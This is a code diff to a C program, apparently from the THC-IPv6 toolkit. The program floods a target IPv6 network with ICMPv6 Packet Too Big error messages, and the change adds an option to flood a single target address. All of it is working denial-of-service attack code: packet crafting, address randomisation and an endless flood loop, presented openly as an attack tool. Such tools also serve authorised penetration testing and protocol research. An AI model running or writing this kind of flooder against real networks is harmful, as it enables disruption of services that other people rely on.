@@ -12,7 +12,7 @@
 
 void help(char *prg) {
   printf("%s %s (c) 2016 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
-  printf("Syntax: %s [-acpPTUrRm] [-s sourceip6] interface target-network\n\n", prg);
+  printf("Syntax: %s [-acpPTUrRmo] [-s sourceip6] interface target-network\n\n", prg);
   printf("Options:\n");
   printf(" -a      add a hop-by-hop header with router alert\n");
   printf(" -c      do not calculate the checksum to save time\n");
@@ -23,6 +23,7 @@ void help(char *prg) {
   printf(" -r      randomize the source from your /64 prefix\n");
   printf(" -R      randomize the source fully\n");
   printf(" -m      generate a maximum size packet\n");
+  printf(" -o      do not flood to network,just flood to target ip\n");
   printf(" -s sourceip6  use this as source IPv6 address\n");
   printf("\nFlood the target /64 network with ICMPv6 TooBig error messages.\n");
   printf("This tool version is manyfold more effective than ndpexhaust6.\n");
@@ -34,7 +35,7 @@ void help(char *prg) {
 int main(int argc, char *argv[]) {
   char *interface, *ptr, buf2[8];
   unsigned char *dst = NULL, *dstmac = NULL, *src = NULL, *srcmac = NULL;
-  int i, offset = 14, type = ICMP6_TOOBIG, alert = 0, randsrc = 0, do_crc = 1, maxsize = 160;
+  int i, offset = 14, type = ICMP6_TOOBIG, alert = 0, randsrc = 0, do_crc = 1, maxsize = 160, oneDst=0;
   unsigned char *pkt = NULL, ip6[8];
   int pkt_len = 0, count = 0;
   thc_ipv6_hdr *hdr;
@@ -67,7 +68,7 @@ int main(int argc, char *argv[]) {
   setvbuf(stdout, NULL, _IONBF, 0);
   setvbuf(stderr, NULL, _IONBF, 0);
   
-   while ((i = getopt(argc, argv, "acpPTUrRs:m")) >= 0) {
+   while ((i = getopt(argc, argv, "acpPTUrRos:m")) >= 0) {
      switch(i) {
        case 'a':
          alert = 8;
@@ -98,6 +99,9 @@ int main(int argc, char *argv[]) {
          break;
        case 's':
          src = thc_resolve6(optarg);
+         break;
+      case 'o':
+         oneDst=1;
          break;
        default:
          fprintf(stderr, "Error: unknown option -%c\n", i);
@@ -164,12 +168,13 @@ int main(int argc, char *argv[]) {
   printf("Starting to flood target network with toobig %s (Press Control-C to end, a dot is printed for every 1000 packets):\n", interface);
   while (1) {
 
+   if(!oneDst){
     for (i = 4; i < 8; i++)
       ip6[i] = rand() % 256;
 
     memcpy(hdr->pkt + offset + 32 + 4, ip6 + 4, 4);
     memcpy(hdr->pkt + offset + 40 + 8 + 8 + 8 + 4 + alert, ip6 + 4, 4);
-    
+    }
     if (randsrc) {
       for (i = randsrc; i < 16; i++)
         hdr->pkt[offset + 8 + i] = rand() % 256;
